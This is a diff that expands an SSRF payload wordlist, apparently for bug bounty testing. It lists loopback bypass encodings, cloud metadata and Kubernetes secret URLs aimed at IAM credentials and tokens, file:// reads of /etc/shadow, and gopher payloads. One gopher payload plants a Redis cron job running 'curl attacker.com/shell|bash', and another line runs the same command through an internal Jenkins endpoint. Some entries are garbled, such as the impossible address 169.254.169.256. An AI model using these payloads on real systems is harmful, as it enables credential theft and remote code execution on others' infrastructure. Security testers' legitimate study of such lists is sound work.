@@ -1,77 +1,347 @@
-# SSRF Payloads
-# Categories: Localhost, Internal Networks, Cloud Metadata, Blind/OOB, Protocol Smuggling
+# SSRF Payloads — Advanced Bug Bounty Edition
+# Sources: PayloadsAllTheThings, HackTricks, PwnDeck, PortSwigger, SSRF Payload Generator (2025-2026)
+# Categories: Cloud Metadata, Loopback Bypass, Protocol Smuggling, Internal Services, Blid/OOB, Filter Bypass
 
-# === Localhost (127.0.0.1) ===
-http://127.0.0.1:80
-http://127.0.0.1:443
-http://127.0.0.1:22
-http://127.0.0.1:3306
-http://127.0.0.1:6379
-http://127.0.0.1:8080
-http://127.0.0.1:8443
-http://127.0.0.1:9200
-http://127.0.0.1:27017
+# ============================================================
+# SECTION 1: LOCALHOST / LOOPBACK ADDRESSES
+# ============================================================
 
-# === Localhost (Alternate Forms) ===
+# --- Standard Forms ---
+http://127.0.0.1
 http://localhost
-http://0.0.0.0
 http://[::1]
-http://0x7f000001
-http://2130706433
-http://017700000001
-http://0x7f.0x0.0x0.0x1
-http://127.1
+http://[::ffff:127.0.0.1]
+
+# --- Omitted / Short Forms ---
+http://0x7f000001   # Hex
+http://0x0.0x0.0x0.0x1
+http://0     # resolves to 0.0.0.0 or localhost in many libraries
+http://0.0.0.0
+http://127.1   # Browsers expand to 127.0.0.1
 http://127.0.1
 http://127.127.127.127
 
-# === Docker / Internal ===
-http://172.17.0.1
-http://172.17.0.2
-http://172.18.0.1
-http://172.19.0.1
-http://10.0.0.1
-http://10.0.0.2
-http://10.0.0.3
-http://10.10.0.1
-http://192.168.0.1
-http://192.168.1.1
+# --- Decimal / Integer ---
+http://2130706433   # 127.0.0.1 as decimal
+http://16777216     # 1.0.0.0
+http://3232235521   # 192.168.0.1
 
-# === Cloud Metadata Endpoints ===
-# AWS
+# --- Octal ---
+http://0177.0.0.1   # 127.0.0.1 in octal
+http://017700000001 # Same as 0x7f000001
+http://0o177.0.0.1
+
+# --- CIDR Notation (some parsers) ---
+http://127.0.0.1/32
+http://0.0.0.0/0
+
+# --- DNS Rebinding Bypass ---
+# Use a domain that alternates between attacker IP and 127.0.0.1
+# Tools: rebinder (rbndr.us), lock.cmpxchg8b.com
+# Example: http://7f000001.8.8.8.8.rbndr.us:8080/
+
+# --- @ Symbol (URL parsing confusion) ---
+http://attacker.com@127.0.0.1:80
+http://127.0.0.1:80@attacker.com
+http://google.com@127.0.0.1:9200
+
+# --- # Symbol (Fragment Confusion) ---
+http://127.0.0.1#@attacker.com
+http://attacker.com#@127.0.0.1
+
+# --- DNS Pinning Bypass ---
+# First request to example.com resolves to 127.0.0.1 (cached),
+# second request uses same resolution
+# Bypass via: http://127.0.0.1:80/path
+
+# --- Unicode / Encoded separators ---
+http://127。0。0。1  (Chinese period)
+http://127．0．0．1
+
+# --- IPv6 Localhost Variants ---
+http://[0:0:0:0:0:0:0:1]
+http://[::1]:80
+http://[0:0:0:0:0:ffff:7f00:1]
+
+# ============================================================
+# SECTION 2: CLOUD METADATA ENDPOINTS
+# ============================================================
+
+# --- AWS IMDSv1 (no token required) ---
 http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/public-ipv4
 http://169.254.169.254/latest/user-data/
 http://169.254.169.254/latest/dynamic/instance-identity/document
-http://169.254.169.254/latest/meta-data/placement/availability-zone
+http://169.254.169.254/latest/network/interfaces/macs/
+http://169.254.169.254/latest/placement/availability-zone
+http://instance-data/latest/meta-data/  # DNS alias for same IP
 
-# GCP
+# --- AWS IMDSv2 (PUT-then-GET: requires X-aws-ec2-metadata-token header) ---
+# Step 1 (GET token):
+#   PUT http://169.254.169.254/latest/api/token
+#   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+# Step 2 (use token):
+#   GET http://169.254.169.254/latest/meta-data/
+#   Header: X-aws-ec2-metadata-token: <TOKEN>
+# Note: IMDSv2 is bypassable if SSRF primitive supports PUT + custom headers
+
+# --- GCP Metadata (requires Metadata-Flavor: Google header) ---
 http://metadata.google.internal/computeMetadata/v1/
 http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com
 http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/instance/machine-type
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/
+http://metadata.google.internal/computeMetadata/v1/instance/kube-env
+# Alias:
+http://metadata.google.internal/
+http://metadata.goog/meta-data/
+# GCP also has 169.254.169.254 alias:
+http://169.254.169.254/computeMetadata/v1/
+# Header required: Metadata-Flavor: Google
 
-# Azure
+# --- Azure Metadata (requires Metadata: true header) ---
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01
 http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
+# Header required: Metadata: true
 
-# DigitalOcean
+# --- DigitalOcean Metadata ---
 http://169.254.169.254/metadata/v1.json
 http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/dns
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+http://169.254.169.254/metadata/v1/ssh-keys
 
-# === Redirect-Based SSRF ===
-http://attacker.com/redirect?target=http://169.254.169.254/
-http://attacker.com/redirect-to?url=http://127.0.0.1:8080
+# --- Oracle Cloud (OCI) Metadata ---
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v1/instance/id
+http://169.254.169.254/opc/v1/instance/displayName
+http://169.254.169.254/opc/v1/instance/region
+http://169.254.169.254/opc/v1/instance/sshAuthorizedKeys
+http://169.254.169.254/opc/v2/instance/
+http://169.254.169.254/opc/v1/instance/metadata/
 
-# === Blind SSRF (Out-of-Band) ===
-http://burpcollaborator.net/test
-http://oastify.com/test
-http://interactsh.com/test
-http://dnslog.cn/test
+# --- Alibaba Cloud (Aliyun) ---
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/region-id
+http://100.100.100.200/latest/meta-data/zone-id
+http://100.100.100.200/latest/meta-data/private-ipv4
+http://100.100.100.200/latest/user-data/
 
-# === Protocol Smuggling ===
+# --- OpenStack / OpenTelekom ---
+http://169.254.169.254/openstack/latest/meta_data.json
+http://169.254.169.254/openstack/latest/user_data
+http://169.254.169.254/openstack/latest/network_data.json
+
+# --- Heroku (Dyno metadata) ---
+http://169.254.169.254/latest/meta-data/
+# Also check env vars: env | grep HEROKU
+
+# ============================================================
+# SECTION 3: INTERNAL NETWORK / DOCKER / KUBERNETES
+# ============================================================
+
+# --- Docker Internal IPs ---
+http://172.17.0.1:80        # Docker host
+http://172.17.0.2:80        # Container 1
+http://172.17.0.3:80
+http://172.18.0.1:80
+http://172.19.0.1:80
+http://172.20.0.1:80
+http://172.16.0.1:80
+
+# --- Kubernetes / Pod Network ---
+http://10.0.0.1:80
+http://10.0.0.2:80
+http://10.1.0.1:80
+http://10.100.0.1:80
+http://10.96.0.1:80         # kube-dns
+http://10.96.0.10:53        # kube-dns
+http://kubernetes.default.svc:443/api/v1/namespaces/default/secrets
+
+# --- Kubernetes Metadata API ---
+http://kubernetes.default.svc
+http://kubernetes.default.svc:443/api/
+http://kubernetes.default.svc:443/api/v1/namespaces/kube-system/secrets/
+http://kubernetes.default.svc:443/api/v1/nodes/
+http://kubernetes.default.svc:443/api/v1/pods/
+# Auth: ServiceAccount token at /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# --- Private IP Ranges to Scan ---
+10.0.0.0/8     (10.0.0.1 - 10.255.255.255)
+172.16.0.0/12  (172.16.0.1 - 172.31.255.255)
+192.168.0.0/16 (192.168.0.1 - 192.168.255.255)
+
+# --- Common Internal Services (ports to probe) ---
+http://127.0.0.1:80         # Web server
+http://127.0.0.1:443        # HTTPS
+http://127.0.0.1:3000       # Node/Grafana/Go
+http://127.0.0.1:3306       # MySQL
+http://127.0.0.1:5432       # PostgreSQL
+http://127.0.0.1:6379       # Redis
+http://127.0.0.1:8080       # Tomcat/Jenkins/Proxy
+http://127.0.0.1:8443       # Tomcat HTTPS
+http://127.0.0.1:9200       # Elasticsearch
+http://127.0.0.1:9300       # Elasticsearch transport
+http://127.0.0.1:9090       # Prometheus
+http://127.0.0.1:5000       # Flask/Swagger
+http://127.0.0.1:4444       # Selenium Grid
+http://127.0.0.1:5555       # Selenium
+http://127.0.0.1:27017      # MongoDB
+http://127.0.0.1:11211      # Memcached
+http://127.0.0.1:2181       # ZooKeeper
+http://127.0.0.1:25         # SMTP
+http://127.0.0.1:135        # RPC
+http://127.0.0.1:445        # SMB
+http://127.0.0.1:3389       # RDP
+http://127.0.0.1:22         # SSH
+http://127.0.0.1:23         # Telnet
+
+# ============================================================
+# SECTION 4: PROTOCOL SMUGGLING
+# ============================================================
+
+# --- file:// — Local File Read ---
 file:///etc/passwd
 file:///proc/self/environ
-dict://127.0.0.1:6379/config
+file:///proc/self/cmdline
+file:///var/www/html/config.php
+file:///etc/shadow
+file:///c:/windows/win.ini
+
+# --- dict:// — Service Interaction ---
+dict://127.0.0.1:6379/info            # Redis info
+dict://127.0.0.1:6379/config/get dir   # Redis config
+dict://127.0.0.1:6379/keys *
+dict://127.0.0.1:3306/info            # MySQL info
+
+# --- gopher:// — Raw TCP (Redis / SMTP / MSSQL) ---
+# Redis FLUSHALL:
 gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a
-ftp://127.0.0.1:21/
+# Redis SET + CRON RCE:
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$46%0d%0a%0a%0a*/1 * * * * /bin/bash -c 'curl http://attacker.com/shell|bash'%0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit
+# SMTP to send email:
+gopher://mail.internal:25/_HELO%20x%0d%0aMAIL%20FROM%3A%20attacker%40x.com%0d%0aRCPT%20TO%3A%20user%40internal.com%0d%0aDATA%0d%0aSubject:%20SSRF%0d%0aTest%0d%0a.%0d%0aQUIT%0d%0a
+
+# --- ftp:// — FTP interaction ---
+ftp://anonymous:anonymous@127.0.0.1:21/
+ftp://127.0.0.1:21/  (may try anonymous)
+
+# --- ldap:// — LDAP interaction ---
+ldap://127.0.0.1:389/
+ldap://127.0.0.1:389/%00
+
+# --- sftp:// / ssh:// ---
+sftp://127.0.0.1:22/
+
+# --- jar:// (Java) ---
+jar:http://attacker.com/evil.jar!/evil.class
+
+# --- netdoc:// (Java) ---
+netdoc:///etc/passwd
+
+# --- php:// (if running PHP) ---
+php://filter/convert.base64-encode/resource=/etc/passwd
+
+# ============================================================
+# SECTION 5: BLIND SSRF (OOB / OUT-OF-BAND DETECTION)
+# ============================================================
+
+# --- OOB Detection URLs ---
+http://burpcollaborator.net/ssrf-test
+http://interactsh.com/ssrf-test
+http://oastify.com/ssrf-test
+http://dnslog.cn/ssrf-test
+http://YOUR-ID.ngrok.io/test
+http://requestbin.net/ssrf-test
+http://webhook.site/ssrf-test
+
+# --- DNS Callback ---
+http://burpcollaborator.net
+http://dnslog.cn/get  (custom DNS callback URL)
+http://interactsh.com/dns
+
+# --- Blind SSRF with DNS Exfiltration ---
+http://burpcollaborator.net/$(whoami).burpcollaborator.net  # May not expand
+# Use collaborator-assigned subdomain:
+http://xxxxxxxxxxxxx.oastify.com
+
+# --- Service Interaction (watch logs) ---
+dict://attacker.com:1337/hello    # Connect back to your listener
+gopher://attacker.com:1337/_hello
+
+# ============================================================
+# SECTION 6: URL PARSER CONFUSION BYPASSES
+# ============================================================
+
+# --- Different URL representation of 169.254.169.254 ---
+http://169.254.169.254/
+http://0xa9fea9fe/          # Hex
+http://2852039166/          # Decimal
+http://0254.0376.0251.0254  # Octal
+http://0xa9.0xfe.0xa9.0xfe
+
+# --- Domain-Based (DNS alias) ---
+http://metadata.nicob.net/  # Points to 169.254.169.254
+
+# --- Redirect-Based Bypass ---
+# Host a redirect on attacker.com:
+#   attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/
+# Then make the app visit: http://attacker.com/redirect?url=...
+
+# --- CRLF Injection for Header Injection ---
+# If the app allows header injection, inject Metadata header:
+url=http://169.254.169.256%0d%0aMetadata-Flavor:%20Google%0d%0a
+
+# --- Case-Sensitive Headers (some parsers) ---
+# GCP: metadata-flavor: google (lowercase may not work)
+# GCP: Metadata-Flavor: Google (correct case)
+
+# ============================================================
+# SECTION 7: SSRF COMBINATIONS / CHAINS
+# ============================================================
+
+# --- SSRF → Elasticsearch → Data Exfiltration ---
+http://127.0.0.1:9200/_all/_search?q=password
+http://127.0.0.1:9200/_cat/indices
+http://127.0.0.1:9200/_nodes
+
+# --- SSRF → Cloud Metadata → IAM Credentials ---
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
+
+# --- SSRF → Redis → RCE (via CRON) ---
+# Using gopher:// to write SSH key or cron job
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a...
+
+# --- SSRF → Kubernetes API → Secrets ---
+http://kubernetes.default.svc:443/api/v1/secrets
+
+# --- SSRF → Internal Service → Reverse Shell ---
+# Use internal service that takes commands (Jenkins, Naggios, etc.)
+http://127.0.0.1:8080/script?cmd=curl+attacker.com/shell|bash
+
+# ============================================================
+# SECTION 8: TOOLS FOR SSRF TESTING
+# ============================================================
+# SSRFmap:         python3 ssrfmap.py -r request.txt -p param
+# Gopherus:        gopherus.py --exploit redis
+# SeeSurfer:       seesurfer (python package)
+# Interactsh:      interactsh-client (OOB detection)
+# Burp Collaborator: built into Burp Suite Professional
+# SSRF Proxy:      ssrf-proxy (tunnel HTTP through SSRF)
